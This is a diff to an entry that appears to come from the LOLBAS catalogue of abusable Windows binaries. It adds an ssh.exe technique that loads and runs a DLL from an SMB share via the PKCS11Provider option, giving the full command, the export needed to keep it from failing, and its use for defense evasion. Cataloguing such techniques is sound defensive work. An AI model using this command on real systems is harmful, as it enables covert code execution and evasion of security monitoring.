@@ -22,6 +22,16 @@ Commands:
     OperatingSystem: Windows 10
     Tags:
       - Execute: CMD
+  - Command: ssh -o PKCS11Provider="\\\\127.0.0.1\\Temp\\Dll1.dll" win@github.com
+    Description: Executes a DLL from an SMB share by abusing the PKCS11Provider option. The payload executes upon DLL load (DllMain) and requires exporting C_GetFunctionList to prevent premature termination by ssh.exe.
+    Usecase: Performs indirect execution of a specified DLL from a remote share, can be used for defense evasion.
+    Category: Execute
+    Privileges: User
+    MitreID: T1202
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: DLL
+      - Execute: Remote      
 Full_Path:
   - Path: c:\windows\system32\OpenSSH\ssh.exe
 Detection:
@@ -30,6 +40,8 @@ Detection:
   - IOC: command line arguments specifying execution.
 Resources:
   - Link: https://gtfobins.github.io/gtfobins/ssh/
+  - Link: https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9
 Acknowledgement:
   - Person: Akshat Pradhan
   - Person: Felix Boulet
+  - Person: Edo Maland
